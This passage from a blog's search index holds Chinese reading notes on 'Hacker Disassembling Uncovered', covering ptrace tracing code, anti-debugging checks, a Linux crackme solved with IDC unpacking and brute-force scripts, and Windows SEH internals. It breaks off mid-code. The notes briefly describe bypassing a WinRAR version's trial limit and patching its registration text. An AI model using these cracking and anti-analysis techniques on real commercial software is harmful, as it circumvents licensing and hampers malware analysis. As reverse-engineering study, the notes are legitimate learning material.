Out[35]: &lt;FP64 fpToFP(x_1_64, DOUBLE)&gt;  ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2018-04/angrDocPart-3.html",
        "teaser":null},{
        "title": "黑客反汇编揭秘读书笔记 1",
        "excerpt":"     本篇是《Hacker Disassembling Uncovered》的笔记。由于这本书出的时间比较长了，我看的版本还是08年出的，里面有很多东西没什么学习的必要，不过多读点书还是好的吧。在这里记个备忘。    第6章   本来想用kerberos的，结果下的都用不了，可能是版本太低了。然后学习了spy monitor，可以用来API窥测，同时进行实时调试，对MFC和win32的支持很好，对指定的API跟踪后，可以推出虚拟地址，进而结合IDA进行分析，节省时间。快速定位API的好方法。 实例的话，分析了winrar_3.42.exe版本，进行注册码的绕过，说实话感觉这部分是比较烦的，对没有win开发经验的我来说有点困难，不过还是简单的绕过了40天试用期的限制。后续的注册还是不成功，关于关键的几个变量分析的还是不够。一个负责模拟对话框的显示，这个不难；一个是信号的处理，这部分就有点吃力了，交叉引用比较多，不是很懂；还有一共负责注册的变量，没分析出来。 后续的话，实现了一个字符串的替换。registered by zjgcjy哈哈 -_-   call  Register  -&gt;mov eax,[字符串地址指针] push eax push 66h push *** call SetDigItemTextA   这里还遇到一点问题，是FOA和RVA的转换问题。开始有点傻了，地址一直算错，(+﹏+)~晕。转换如下：RVA - RVA(段) == FOA - FOA(段) 因为PE载入后，各节内部相对偏移量不变。 PE结构相关   第8章   ptrace   ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。使用ptrace，可以在用户层拦截和修改系统调用(sys call)。一个被跟踪的进程运行中，直到发生信号。则进程被中止，并且通知其父进程。在进程中止的状态下，进程的内存空间可以被读写。父进程还可以使子进程继续执行，并选择是否是否忽略引起中止的信号。   追踪子进程   实例如下。   //int ptrace(int request, int pid, int addr, int data); #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; #include &lt;errno.h&gt; #include &lt;sys/ptrace.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;sys/reg.h&gt;   /* /usr/include/sys/reg.h*/  int main() {        pid_t child;     long orig_rax;     child = fork();     if(child == 0)     {         //设置子进程被跟踪         ptrace(PTRACE_TRACEME, 0, NULL, NULL);         execl(\"/bin/ls\", \"ls\", NULL);     }     else     {         wait(NULL);         //从子进程的USER域中读取寄存器的值         orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL);         printf(\"The child made a system call %ld\\n\", orig_rax);         //子进程继续执行         ptrace(PTRACE_CONT, child, NULL, NULL);     }     return 0; }   解释：父进程fork了一个子进程，并且在子进程中进行系统调用。在执行前，子进程运行了ptrace，设置第一个参数是 PTRACE_TRACEME，这告诉内核当前进程正在被追踪。当子进程运行execve()之后，会把控制权转回父进程。父进程通过wait()来等待内核通知，现在它得到了通知。然后就可以查看子进程都做了什么，比如查看寄存器的值之类。当系统调用出现的时候，内核会保存原始的rax寄存器值(系统调用号)，我们可以从子进程的USER段读取这个值，这里是使用ptrace并且设置第一个参数为PTRACE_PEEKUSER。当我们检查完了系统调用之后, 可以调用ptrace并设置参数PTRACE_CONT让子进程继续运行。   输出结果。可以看到execve的系统调用号是59。   ➜  Desktop./ptrace64 The child made a system call 59 desktop.ini                   ptrace64              wrar56b1   Hacker Disassembling Uncovered  ptrace.c                      Xman                  IDA&amp;Z3&amp;angr                     Shellcoder's Handbook     ptrace函数原型如下。 long ptrace(enum __ptrace_request request,             pid_t pid,             void *addr,             void *data); 关于ptrace的第一部分的参数表如下。                  Request参数       说明                       PTRACE_TRACEME       本进程被其父进程所跟踪                 PTRACE_PEEKTEXT,PTRACE_PEEKDATA       从内存地址中读取一个字节，内存地址由addr给出                 PTRACE_PEEKUSR       从USER区域中读取一个字节，偏移量为addr                 PTRACE_POKETEXT,PTRACE_POKEDATA       往内存地址中写入一个字节。内存地址由addr给出                 PTRACE_POKEUSR       往USER区域中写入一个字节。偏移量为addr                 PTRACE_SYSCALL,PTRACE_CONT       重新运行                 PTRACE_KILL       杀掉子进程，使它退出                 PTRACE_SINGLESTEP       设置单步执行标志                 PTRACE_ATTACH       跟踪指定pid 进程                 PTRACE_DETACH       结束跟踪              读取子进程系统调用参数   系统调用的参数按顺序存放在rbx,rcx…之中,因此以write系统调用为例看如何读取寄存器的值:   #include &lt;sys/ptrace.h&gt; #include &lt;sys/wait.h&gt; #include &lt;sys/user.h&gt; #include &lt;sys/syscall.h&gt; /* SYS_write */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; #include &lt;errno.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/reg.h&gt;   /* /usr/include/sys/reg.h*/  int main() {     pid_t child;     long orig_rax;     int status;     int iscalling = 0;     struct user_regs_struct regs;      child = fork();     if(child == 0)     {         //设置子进程被跟踪         ptrace(PTRACE_TRACEME, 0, NULL, NULL);         execl(\"/bin/ls\", \"ls\", \"-l\", \"-h\", NULL);     }     else     {         while(1)         {             wait(&amp;status);             //子进程暂停继续，子进程退出则退出             if(WIFEXITED(status))                 break;             //获取系统调用号             orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL);             if(orig_rax == SYS_write)             {                 //读取user_regs_struct结构体中的数据                 ptrace(PTRACE_GETREGS, child, NULL, &amp;regs);                 //开始，打印寄存器                 if(!iscalling)                 {                     iscalling = 1;                     //rdx是长度                     printf(\"SYS_write call with %lld, %lld, %lld\\n\", regs.rdi, regs.rsi, regs.rdx);                 }                 //结束，打印寄存器                 else                 {                     iscalling = 0;                     printf(\"SYS_write call return %lld\\n\", regs.rax);                 }             }             ptrace(PTRACE_SYSCALL, child, NULL, NULL);         }     }     return 0; }   输出如下。   ➜  Desktop ./a.out SYS_write call with 1, 32001776, 14 总用量 60K SYS_write call return 14 SYS_write call with 1, 32001776, 47 -rwxrwxrwx 1 root root 1.4K 3月  20 15:56 2.c SYS_write call return 47 SYS_write call with 1, 32001776, 49 -rwxrwxrwx 1 root root 8.7K 3月  20 16:02 a.out SYS_write call return 49 SYS_write call with 1, 32001776, 55 -rwxrwxrwx 1 root root  282 3月  15 16:40 desktop.ini SYS_write call return 55 SYS_write call with 1, 32001776, 74 drwxrwxrwx 0 root root  512 3月  19 22:44 Hacker Disassembling Uncovered SYS_write call return 74   可以看到ls -l -h发生了多次write系统调用，这里读取寄存器的时候可以用之前的PTRACE_PEEKUSER参数,也可以直接用PTRACE_PEEKUSER参数将寄存器的值读取到结构体user_regs_struct，该结构体定义在sys/user.h中。程序中WIFEXITED宏用来检查子进程是被ptrace暂停的还是准备退出，PTRACE_SYSCALL作用是使内核在子进程进入和退出系统调用时都将其暂停，等价于调用PTRACE_CONT并且在下一个系统调用前暂停。   ptrace其他用法   上面两个例子可以看到，ptrace的用法有很多，还比如：修改子进程系统调用参数、向其它程序注入指令等。这些和HOOK有关了，是比较有意思的用法，我也看过了，基本和上面读取子进程的用法差不多，添加了读取数据、修改数据、写入数据这三部分，从而HOOK了write函数。   参考资料1 参考资料2 其他关于HOOK的姿势  ","categories": [],
        "tags": ["linux","assemble","ptrace"],
        "url": "https://zjgcjy.github.io/posts/2018-04/%E9%BB%91%E5%AE%A2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8F%AD%E7%A7%98%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1.html",
        "teaser":null},{
        "title": "黑客反汇编揭秘读书笔记 2",
        "excerpt":"     本篇是《Hacker Disassembling Uncovered》的笔记。由于这本书出的时间比较长了，我看的版本还是08年出的，里面有很多东西没什么学习的必要，不过多读点书还是好的吧。在这里记个备忘。    第10章   TF标志位   在反调试的方法中，有一种方式是使用PUSHFD /POP REG命令来读取FLAGS寄存器的值，随后检查追踪标志位TF来判断程序是否被调试。TF—陷阱标志，为程序调试而设。当TF=1，CPU处于单步执行指令的方式。当TF=0时，CPU正常执行程序。下面给出一种检测方式。   int anti_debug() { \tint a=0; \t\\_\\_asm \t{ \t\t; int 03  \t\tpushfd \t\tpop eax \t\tand eax, 100h \t\tjnz under_debugger \t\tdec [a] \tunder_debugger: \t} return a; }   但是这种方式我简单试了一下，一直都失败了，原因未知。这里Windows下常见的反调试方法包含了很多反调试的实现方式，也有用到TF的，但是总的来说这个方式来检测还是有点问题。下面给出一种win32使用api中读取寄存器的方式，我觉得是一种比较好的实现反调试方式。之后有时间就来实现一下。 Win32调试器读取寄存器和内存 恶意样本分析手册——反调试篇   ptrace反调试   上一个笔记记录了ptrace的用法，这次来讲一下ptrace也可以用于反调试。首先还是复习一下ptrace的函数原型   #include &lt;sys/ptrace.h&gt;         // /usr/include/sys/ptrace.h long ptrace(enum \\_\\_ptrace_request request, pid_t pid, void *addr, void *data); 1). enum __ptrace_request request：指示了ptrace要执行的命令。 2). pid_t pid: 指示ptrace要跟踪的进程。 3). void *addr: 指示要监控的内存地址。 4). void *data: 存放读取出的或者要写入的数据。   怎样实现反调试：一个进程只能被一个进程ptrace，如果自己调用ptarce，这样其它程序就无法通过ptrace调试或者向进程注入代码。一般通过检测ptrace的返回值来判断当前是否再被调试。 代码实现：（包括LD_PRELOAD检测，也是反HOOK的一种方法）   if ( getenv(\"LD_PRELOAD\") ) {     while ( 1 ); } //ptrace(PTRACE_TRACEME,0 ,0 ,0) result = ptrace(0, 0LL, 0LL, 0LL); if ( result &lt; 0 ) {     while ( 1 ); } return result;   结果如下图所示，可以看到，调用ptrace后，rax寄存器的值是-1，即ptrace调用失败（成功则返回0），继而进入死循环。   第11章   PE代码插入和删除   插入分类，有四种。 A类：不改变寻址方式，插入后使文件长度和内存量都不变。应用于在宿主文件的可用空闲区域，包括PE头、分区尾部。 B类：只改变物理寻址方式，即文件长度会发生变化但是分配的文件内存里不会变化，但是由于物理地址的变化导致需要部分或者全部重建相关结构，应用于修改文件头的大小、将原始文件的部分内容移到数据区、创建新的附加数据。 C类：同时改变文件大小和内存映射，应用于拓展文件的最后一个节，创建自己的节等。 Z类：不接触宿主文件但是以间接方式将X码插入到文件地址空间。 关于这一章的内容，我觉得这部书讲的不好，阅读后没什么感觉，关于PE修改的东西，之后读《WindowsPE权威指南的时候》再练习吧。   第12章   实操Linux-crackme   linux下的crackme一向不多，这题我下载下来看了，是个好题。特点如下：      ELF文件头遭破坏   动态自修改代码   反gdb   反ptrace   运行是可以运行的，调试是不可以调试的（笑），gdb拒绝，objdump不支持分析，ida打开也出现了问题，很明显就是ELF文件头遭到破坏了。记录报错信息：elf头入口大小无效（PROGRAM_HEADER_OFFSET_IN_FILE）、SHT入口大小无效（SECTION_HEADER_ENTRY_SIZE），这我们都不管，直接让IDA继续分析好了。   第一部分      一进来就是start函数，entry point 从FOA0x08开始，然后接连两个跳转。      这里先复习下指令   lodsb指令将esi指向的地址处的数据取出来赋给AL寄存器 mov AL [edi]  esi=esi+1 lodsw指令取的是一个字。 lodsd指令取的是双字节，即 mov eax [esi] esi=esi+4  stosb指令将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi] AL edi=edi+1 stosw指令取的是一个字。 stosd指令取的是双字节，即 mov [edi] eax edi=edi+4   于是分析下sub_2002F0这个函数，可以看到，取loc_20004B地址，然后循环开始亦或解码。设置ecx寄存器是循环次数0x2a5»2，即169。每次亦或的值是0x3F5479F1。使用idc编写脚本进行动态求解。   static unpack(addr, key, times) {     auto i;     for (i = 0; i &lt; times; )     {         PatchDword(addr + i, Dword(addr + i) ^ key);         //Message(\"%#x %#x\\n\", addr + i, Dword(addr + i));         i = i + 4;     } }   然后unpack(0x0020004B, 0x3F5479F1, 0x2A5)就能恢复一部分数据，就是start后面的一部分。注意的是，sub_2002F0前3个字节也被patch过了，所以解密后回去再看这个函数头部就会有问题，这里没什么用。直接返回到start了。 回到start后，由于之前的加密数据的原因，ida这里现实start已经结束了，其实并没有，这里我修改start函数，结束改为0x002000E0处，可以看到start接下来的部分。      可以看到，在encode1解密后，立即设置ebx寄存器是0xf4»2，取unk_20019E地址，调用sub_2002BC函数，很明显，该函数和上面一样，同样是在解密。调用上面那个函数进行解密。unpack(0x0020019e, 0x0BEEFC0DA, 0xf4)，解密完成后，发现就是对明文字符串进行解密。      第二部分   两次解密完成后，取字符串地址，设置edx，同时调用sub_20029A函数。执行以下指令。   xor     eax, eax mov     ebx, eax        ; fd = 0 mov     al, 4\t\t\t; 4号系统调用 int     80h             ; LINUX - sys_write retn   很明显就是该函数就是write函数，打印出第二次解密的一堆字符串。然后继续start函数，接下来就是一个ptrace反调试。可以用cat /usr/include/asm/unistd_32.h |grep ptrace来查看ptrace的系统调用号，在32位中就是26。这里ptrace中的ptrace_request值在ebx寄存器中，为61。接下来判断返回值是不是0，是0则继续，调用失败则打印失败。当成功时，跳转到loc_20009C这里。 这里首先压栈，其次调用read函数，这部分和write差不多，syscall是3，fd=1。要注意的是，读取的字符长度只有4，因为ecx指向的就是只有4byte的缓冲区。然后调用check函数，判断返回的ebx和输入是否相等，不相等则失败。相等则弹栈，再比较ebx，ebx为0则成功。      第三部分   最后来看一下关键的check函数。可以看到对start开始逐双字进行加法，然后对结果进行亦或，最后返回。需要注意的是，在CRC校验的过程中，输入的字节地址在CRC校验的范围内。即result = ((CRC + key) ^ 0x5508046b) ，又和输入的值进行亦或，然后为0则正确。      这里贴上CRC校验的idc脚本。   static calcCRC(addr, times) { \tauto i, result;     result = 0;     for (i = 0; i &lt; times; i++)     {         result = (result + Dword(addr + 4 * i));         Message(\"%x\\n\", Dword(addr + 4 * i));     }     Message(\"result = %x \\n\", result);     //result = 0x7d5c6d9 } calcCRC(0x0200008, 0xb7);   所以得到flag的条件是((CRC + key) ^ 0x5508046b) ^ key == 0即(0x7d5c6d9 + key == key ^ 0x5508046b)根据这个写脚本爆破就好了，开始我以为是对的，但是跑了半天一个解也没有，很奇怪。然后我仔细看这个key的位置，能发现，key的位置很特殊，DWORD中的低字是上一个DWORD的高字，高字是下一个DWORD的低字。所以两个key是不一样的，(0x7d5c6d9 + key(转换) == key ^ 0x5508046b)，之后再爆破即可，同时根据flag是明文来缩小范围。   附完整idc脚本。   #include &lt;idc.idc&gt;  static unpack(addr, key, times) {     auto i;     for (i = 0; i &lt; times; i++)     {         PatchDword(addr + 4 * i, Dword(addr + 4 * i) ^ key);         //Message(\"%#x %#x\\n\", addr + 4* i, Dword(addr + 4 * i));     } }  static calcCRC(addr, times) { \tauto i, result;     result = 0;     for (i = 0; i &lt; times; i++)     {         result = (result + Dword(addr + 4 * i));         //Message(\"%x\\n\", Dword(addr + 4 * i));     }     Message(\"result = %x \\n\", result);     return result; }  static getFlag() { \tauto result, key; \tresult = calcCRC(0x0200008, 0xb7);  \tauto a, b, c, d, temp; \tfor(a = 0x30; a &lt; 0x7f; a++) \t{ \t\tfor(b = 0x30; b &lt; 0x7f; b++) \t\t{ \t\t\tfor(c = 0x30; c &lt; 0x7f; c++) \t\t\t{ \t\t\t\tfor(d = 0x30; d &lt; 0x7f; d++) \t\t\t\t{ \t\t\t\t\tkey = a &lt;&lt; 24 | b &lt;&lt; 16 | c &lt;&lt; 8 | d; \t\t\t\t\ttemp = result + ((key &lt;&lt; 16) + (key &gt;&gt; 16)); \t\t\t\t\ttemp = temp ^ 0x5508046b; \t\t\t\t\tif((temp ^ key) == 0) \t\t\t\t\t{ \t\t\t\t\t\tmsg(\"key found!(%x) is %c%c%c%c \\n\", key, d, c, b, a); \t\t\t\t\t} \t\t\t\t} \t\t\t} \t\t} \t}  \tMessage(\"finished\"); }  static main() { \tunpack(0x0020004B, 0x3F5479F1, 0xa9); \tunpack(0x0020019e, 0xBEEFC0DA, 0x3d); \tgetFlag(); }    最后计算key如果用ida太慢的话，可以用c来爆破，附脚本。   #include &lt;windows.h&gt; #include &lt;stdio.h&gt; using namespace std;  int main() { \tfor(BYTE a = 0x30; a &lt; 0x7f; a++) \t{ \t\tfor(BYTE b = 0x30; b &lt; 0x7f; b++) \t\t{ \t\t\tfor(BYTE c = 0x30; c &lt; 0x7f; c++) \t\t\t{ \t\t\t\tfor(BYTE d = 0x30; d &lt; 0x7f; d++) \t\t\t\t{ \t\t\t\t\tDWORD key = a &lt;&lt; 24 | b &lt;&lt; 16 | c &lt;&lt; 8 | d; \t\t\t\t\tDWORD temp = 0x7d5c6d9 + ((key &lt;&lt; 16) + (key &gt;&gt; 16)); \t\t\t\t\ttemp = temp ^ 0x5508046b; \t\t\t\t\tif((temp ^ key) == 0) \t\t\t\t\t{ \t\t\t\t\t\tprintf (\"key found!(%x) is %c%c%c%c \\n\", key, d, c, b, a); \t\t\t\t\t} \t\t\t\t} \t\t\t} \t\t} \t} }  总体来说，这题还是学到很多知识的，自解密代码，CRC校验，包括大小端和对齐问题。以后有空再补一下elf文件格式的相关知识。  ","categories": [],
        "tags": ["linux","assemble","SMC"],
        "url": "https://zjgcjy.github.io/posts/2018-04/%E9%BB%91%E5%AE%A2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8F%AD%E7%A7%98%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2.html",
        "teaser":null},{
        "title": "黑客反汇编揭秘读书笔记 3",
        "excerpt":"     本篇是《Hacker Disassembling Uncovered》的笔记。由于这本书出的时间比较长了，我看的版本还是08年出的，里面有很多东西没什么学习的必要，不过多读点书还是好的吧。在这里记个备忘。    第13章   关于X86-64体系结构   寄存器方面，额外提供了8个基础寄存器，除了原来的8个寄存器外，现在就有16个GPR了。新的寄存器的编号是从R8到R15，要访问他们的低8位，低16位和低32位可以分别使用b、w和d后缀。应用编程寄存器还包括128位的媒体控制寄存器。 关于寻址，在x64中不存在绝对寻址。 关于传参。使用fastcall调用约定，即第一个参数（最左边）用ecx，第二个用edx，第三个用r8，第四个用r9。若参数数量大于5，则使用压栈的方式。这里说的应该是windows的，linux64中的传参方式用了6个寄存器，从左到右依次是edi，esi，edx，ecx，r8，r9。   第17章   首先复习一下TEB、PEB和fs寄存器。   TEB   线程环境块，位于用户地址空间，在比 PEB 所在地址低的地方。包含进程中运行线程的各种信息，每个线程都对应一个TEB结构体。一个进程的所有TEB都以堆栈的方式，存放在线性内存中。在用户态可通过CPU的FS寄存器来访问该段，因为FS寄存器在用户态的时候总是指向当前线程的TEB，一般存储在[FS:0]。还可以通过OS提供的API Ntdll.NtCurrentTeb()来访问TEB的地址。该函数原理如下：   mov eax, DWORD PTR FS:[18] RETN   关于TEB中的每一项的内容，我这里只介绍常用的部分。   +0x000 NtTib   TEB的结构体的第一个成员NtTib即为我们常说的TIB线程信息块。其中0x00位置指向 \\_EXCEPTION_REGISTRATION_RECORD 结构体的链表指针（SEH）。0x18位置为_NT_TIB结构体的self指针，即为NtCurrentTeb() 函数所读出的TEB结构体指针。   +0x020 ClientId   有2个变量，其中位于0x020的是UniqueProcess，为当前进程的的Pid，可用函数 GetCurrentProcessId() 访问当前结构体成员获取进程标识符。另一个变量位于0x024的是UniqueThread，为当前进程的的Tid，可用函数 GetCurrentThreadId() 访问当前结构体成员获取线程标识符。原理如下：   ;获取pid mov eax, dword ptr fs:[0x18] mov eax, dword ptr [eax+0x20] ;获取tid mov eax, dword ptr fs:[0x18] mov eax, dword ptr [eax+0x24]   +0x030 ProcessEnvironmentBlock   这里存放的是PEB结构体的指针，所以说一般 fs:[0x30] 即为PEB的起始地址。   PEB   进程环境块，位于用户地址空间。存放进程信息，每个进程都有自己的PEB信息。PEB地址应从系统的EPROCESS结构的0x1b0偏移处获得，但访问EPROCESS需要ring0的权限。用户态可以通过TEB结构的偏移0x30处获得PEB的位置。mov eax,fs:[0x30]   +0x002 BeingDebugged   表示当前进程是否处于调试状态，也就是函数 IsDebuggerPresent() 所访问的结构体成员。   mov eax, byte ptr fs:[0x30] movzx eax, byte ptr [eax+0x2]   +0x018 ProcessHeap   这个结构体成员就是进程堆的句柄，也就是指向结构体HEAP的指针。该结构体成员指向的HEAP结构体指针可用函数 GetProcessHeap()获取。其中偏移量是0x00c是Flags，0x010是ForceFlags。程序正常运行时，两个值分别是2和0。   mov eax, byte ptr fs:[0x30] movzx eax, byte ptr [eax+0x18]   +0x068 NtGlobalFlag   在调试状态时，NtGlobalFlag 的值为0x70。   mov eax, byte ptr fs:[0x30] movzx eax, byte ptr [eax+0x68] test eax, 0x70   关于PEB和TEB之间的关系，总结如下。 FS:[0x18] = FS:[0x00] （0x18处就是self指针） FS:[0x30] = &amp;PEB FS:[0x00] = &amp;SEH   x64下注意点   上面讨论的包括fs寄存器在内都是在x86基础内的，在x86中，fs段寄存器用于指向TEB和处理器控制区（Processor Control Region, KPCR）。但是，到了x64的时，fs的角色已经换成了gs。gs段寄存器在用户态指向TEB，在内核态指向KPCR。然而，当运行WOW64程序中，fs存器仍然指向32位的TEB。而且偏移量也不一样了。gs+0x30是TEB的self指针。其他wiki上也没有。。   SEH   结构化异常处理SEH是Windows操作系统提供的强大异常处理功能。而Visual C++中的__try{}/__finally{}和__try{}/__except{}结构本质上是对Windows提供的SEH的封装。注意：SEH是基于线程的异常处理。而且except和finally不像java或者python一样可以公用，在C里面是不可以一起用的。而且在try块中使用__leave关键字会使程序跳转到try块的结尾，从而自然的进入finally块。   封装在VC中的SEH   常见的流程如下。   __try {        // 受保护的代码 } __except ( /*异常过滤器exception filter*/ ) {        // 异常处理程序exception handler }      其中异常过滤器只有三个可能的值（定义在Windows的Excpt.h中） EXCEPTION_EXECUTE_HANDLER      1     表示该异常被处理。从异常处下一条指令继续执行 EXCEPTION_CONTINUE_SERCH       0     表示不能处理该异常，继续搜索执行下一个EH EXCEPTION_CONTINUE_EXECUTION  -1     表示该异常被忽略。从异常处处继续执行 两种基本的使用方式：   //方式一：直接使用过滤器的三个返回值之一 __try {    …… } __except ( EXCEPTION_EXECUTE_HANDLER ) {    …… }  //方式二：自定义过滤器 __try {    …… } __except ( MyFilter( GetExceptionCode() ) ) {    …… }  LONG MyFilter ( DWORD dwExceptionCode ) {     if ( dwExceptionCode == EXCEPTION_ACCESS_VIOLATION )             return EXCEPTION_EXECUTE_HANDLER ;     else             return EXCEPTION_CONTINUE_SEARCH ; }   显然方式2更好，对传入参数进行检查，如果异常类型是越权访问，则进行处理，否则则进行进一步搜索。   下面介绍trycatch的全局展开流程。      同时上代码：   #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;iostream&gt; using namespace std;  static unsigned int nStep = 1 ;  void Function_B () {     int x, y = 0 ;     \\__try {         x = 5 / y ; // 引发异常     }     \\__finally     {         cout &lt;&lt; \"Step \" &lt;&lt; nStep++ &lt;&lt; \" : 执行Function_B的finally块的内容\" &lt;&lt; endl ;     } }  void Function_A ( ) {     \\__try {         Function_B () ;     }     \\__finally     {         cout &lt;&lt; \"Step \" &lt;&lt; nStep++ &lt;&lt; \" : 执行Function_A的finally块的内容\" &lt;&lt; endl ;     } }  long MyExcepteFilter ( ) {     cout &lt;&lt; \"Step \" &lt;&lt; nStep++ &lt;&lt; \" : 执行main的异常过滤器\" &lt;&lt; endl ;     return EXCEPTION_EXECUTE_HANDLER ; }  int main () {     \\__try {         Function_A () ;     }     __except ( MyExcepteFilter() )     {         cout &lt;&lt; \"Step \" &lt;&lt; nStep++ &lt;&lt; \" : 执行main的except块的内容\" &lt;&lt; endl ;     }      return 0 ; }   程序的流程如下图所示。      总体来说，当遇到嵌套的try-except时，首先递归向上查找过滤器的值，只有值是EXCEPTION_EXECUTE_HANDLER的时候，执行该except的功能（或自定义函数），然后回到递归的最底层，进行全局展开，递归向上进行finally块的输出。 当未进行异常处理时，产生异常，windows将弹出异常对话框。这个功能是在UnhandledExceptionFilter中实现的，在启动进程、线程时，系统会安装一个最顶层的异常处理try-except结构。   上面就是VC封装后的SEH处理过程，下面讲下windows下的各种异常处理手段，从底层看VC是怎么封装SEH的。   VEH、SEH、VCH、UEF的系统实现   SEH异常回调函数定义：   EXCEPTION_DISPOSITION __cdecl _except_handler (       struct \\_EXCEPTION_RECORD *\\_ExceptionRecord,  //异常记录结构指针     void * \\_EstablisherFrame,  　　　　　　　　　　 //指向EXCEPTION_REGISTRATION结构,即SEH链     struct \\_CONTEXT *\\_ContextRecord,　　　　　　//Context结构指针 (线程上下文)     void * \\_DispatcherContext  　　　　　　　　　//无意义 (调度器上下文?) );   先看返回值。   typedef enum _EXCEPTION_DISPOSITION {       ExceptionContinueExecution,         //0   重新执行异常指令     ExceptionContinueSearch,            //1   搜索下一个SEH     ExceptionNestedException,           //2       ExceptionCollidedUnwind             //3   } EXCEPTION_DISPOSITION;     回调函数有4个指针，第一个是异常记录指针，在WINNT.H中定义，结构如下：   typedef struct _EXCEPTION_RECORD {     DWORD    ExceptionCode;   //异常代码，说明是什么异常，比如单步、除零、断点等等     DWORD ExceptionFlags;      //异常标志     struct \\_EXCEPTION\\_RECORD  \\*ExceptionRecord;   //指向下一个异常记录（EXCEPTION\\_RECORD）的指针     PVOID ExceptionAddress;   //发生异常的地址     DWORD NumberParameters;  //异常信息的个数（即数组ExceptionInformation的个数）     ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];  //异常信息数组 } EXCEPTION_RECORD, *PEXCEPTION_RECORD;   这个结构中的 ExcepitonCode成员是赋予异常的代码。通过在WINNT.H中搜索以“STATUS_”开头的＃define定义，你可以得到一个异常代码列表。例如STATUS_ACCESS_VIOLATION的代码是0xC0000005。一个更全面的异常代码列表可以在 Windows NT DDK的NTSTATUS.H中找到。此结构的第四个成员是异常发生的地址。其它成员暂时可以忽略。   第三个参数是指向上下文的指针，在WINNT.H中定义，它代表某个特定线程的寄存器值。结构如下：   typedef struct _CONTEXT {     DWORD ContextFlags;     DWORD   Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;     FLOATING_SAVE_AREA FloatSave;     DWORD   SegGs, SegFs, SegEs, SegDs;     DWORD   Edi, Esi, Edx, Ebx, Ecx, Eax, Ebp, Eip;     DWORD   SegCs;              // MUST BE SANITIZED     DWORD   EFlags;             // MUST BE SANITIZED     DWORD   Esp;     DWORD   SegSs;     BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; } CONTEXT, *PCONTEXT;   这里的关键是_exept_handler回调函数接收到操作系统传递过来的许多有价值的信息，例如异常的类型和发生的地址。使用这些信息，异常回调函数就能决定下一步做什么。   EXCEPTION_REGISTRATION   typedef struct _EXCEPTION_REGISTRATION {     DWORD  prev;        //* EXCEPTION_REGISTRATION     DWORD  handler;     // \\*\\_except_handler } EXCEPTION_REGISTRATION;   这个结构就是fs寄存器所指向的位置，即在WINNT.H的NT_TIB结构的定义中被称为_EXCEPITON_REGISTARTION_RECORD。这里的第一个参数是前一个EXCEPTION_REGISTRATION的指针，第二个参数是指向_except_handler回调函数的指针。   当异常发生时，系统查找出错线程的TIB，获取指向EXCEPTION_REGISTRATION结构的指针。在这个结构中有一个指向_except_handler回调函数的指针。      简单模拟上述过程：   #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;iostream&gt; using namespace std;  DWORD scratch;   EXCEPTION_DISPOSITION  __cdecl   _except_handler( struct \\_EXCEPTION_RECORD *ExceptionRecord, void * EstablisherFrame, struct \\_CONTEXT *ContextRecord, void * DispatcherContext )   {       printf( \"Hello from an exception handler\\nscratch:%#x\\n\",scratch );       // 改变CONTEXT结构中EAX的值，以便它指向可以成功进写操作的位置       ContextRecord-&gt;Eax = (DWORD)&amp;scratch;       // 告诉操作系统重新执行出错的指令   \treturn ExceptionContinueExecution;     // 若返回ExceptionContinueSearch则将继续搜索下一个SEH }    int main()   {       DWORD handler = (DWORD)\\_except_handler;       \\__asm       {            // 创建EXCEPTION_REGISTRATION结构：           push handler\t\t// handler函数的地址           push FS:[0]\t\t\t// 前一个handler函数的地址           mov FS:[0],ESP\t\t// 安装新的EXECEPTION_REGISTRATION结构       }       \\__asm       {           mov eax,0\t\t\t// 将EAX清零           mov [eax], 1\t\t// 写EAX指向的内存从而故意引发一个错误       }       printf( \"After writing!\\n\" );       \\__asm       {            // 移去我们的EXECEPTION_REGISTRATION结构           mov eax,[ESP]\t\t// 获取前一个结构           mov FS:[0], EAX\t\t// 安装前一个结构           add esp, 8\t\t\t// 将我们的EXECEPTION_REGISTRATION弹出堆栈       }       return 0;   }     这只是一种最简单的方法，下面将说明os实现的SEH链表。      #include &lt;windows.h&gt; #include &lt;stdio.h&gt; EXCEPTION_DISPOSITION __cdecl _except_handler(               struct \\_EXCEPTION_RECORD *ExceptionRecord,               void * EstablisherFrame,               struct \\_CONTEXT *ContextRecord,                void * DispatcherContext ) {     printf( \"Home Grown handler: Exception Code: %08X Exception Flags %X\",     ExceptionRecord-&gt;ExceptionCode, ExceptionRecord-&gt;ExceptionFlags );     if ( ExceptionRecord-&gt;ExceptionFlags &amp; 1 )     printf( \" EH_NONCONTINUABLE\" );     if ( ExceptionRecord-&gt;ExceptionFlags &amp; 2 )     printf( \" EH_UNWINDING\" );     if ( ExceptionRecord-&gt;ExceptionFlags &amp; 4 )     printf( \" EH_EXIT_UNWIND\" );     if ( ExceptionRecord-&gt;ExceptionFlags &amp; 8 )     printf( \" EH_STACK_INVALID\" );     if ( ExceptionRecord-&gt;ExceptionFlags &amp; 0x10 )     printf( \" EH_NESTED_CALL\" );     printf( \"\\n\" );     // 让其它函数处理     return ExceptionContinueSearch; }  void HomeGrownFrame( void ) {     DWORD handler = (DWORD)\\_except_handler;     \\__asm     {        // 创建EXCEPTION_REGISTRATION结构：        push handler       // handler函数的地址        push FS:[0]        // 前一个handler函数的地址        mov FS:[0],ESP     // 安装新的EXECEPTION_REGISTRATION结构     }     \\*(PDWORD)0 = 0; // 